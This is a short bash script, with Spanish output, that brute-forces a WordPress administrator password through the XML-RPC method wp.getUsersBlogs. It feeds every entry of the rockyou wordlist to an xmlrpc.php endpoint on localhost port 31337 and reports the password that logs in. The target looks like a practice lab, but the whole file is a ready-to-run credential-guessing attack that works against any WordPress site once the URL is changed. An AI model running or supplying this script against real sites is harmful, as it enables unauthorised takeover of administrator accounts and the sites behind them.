#!/bin/bash

function createXML(){

password=$1

xmlfile="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param>
<value><string>admin</string></value>
</param>
<param>
<value><string>$password</string></value>
</param>
</params>
</methodCall>"

echo "$xmlfile" > file.xml

response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" \
-H "Content-Type: text/xml" \
-d @file.xml)

if ! echo "$response" | grep -q "Incorrect username or password"; then
    echo "[+] Password encontrada: $password"
    exit 0
fi
}

cat /usr/share/wordlists/rockyou.txt | while read -r password; do
    createXML "$password"
done
   